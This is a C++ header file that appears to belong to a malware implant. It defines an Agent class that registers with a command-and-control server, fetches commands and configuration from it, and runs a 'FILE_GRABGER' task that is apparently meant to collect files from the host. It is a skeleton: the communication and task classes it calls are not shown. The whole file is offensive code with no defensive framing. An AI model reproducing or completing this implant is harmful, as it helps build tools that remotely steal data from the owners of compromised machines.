#pragma once

#include "Task.h"
#include <vector>
#include <thread>
#include <unistd.h>

using namespace std;
using json = nlohmann::json;

#define DEBUG

class Agent
{
private:

    bool agent_run;

    std::vector<std::unique_ptr<Task>> tasks;
    json config;

    void run_all_tasks()
    {
        std::cout << "Running " << tasks.size() << " tasks !" << std::endl;

        for (const std::unique_ptr<Task> & t: tasks)
        {
            t->run();
        }
        
    }

    void start_from_config(const json & config)
    {
        /*  
        iterate config
        construct each module derived class 
        build a task
        run all tasks
        */

        Task * t = Task::BuildTask("FILE_GRABGER", config["FILE_GRABGER"]);

        tasks.push_back(std::unique_ptr<Task>(t));
        
        run_all_tasks();
    }

    bool agent_register()
    {
        return Communicator::getInstance().c2_registration();
    }

    bool get_server_config()
    {
        return Communicator::getInstance().check_new_command(&config);
    }

public:
    Agent() : agent_run(true) {

    }

    ~Agent()
    {
        
    }

    void start();

    void stop();
};
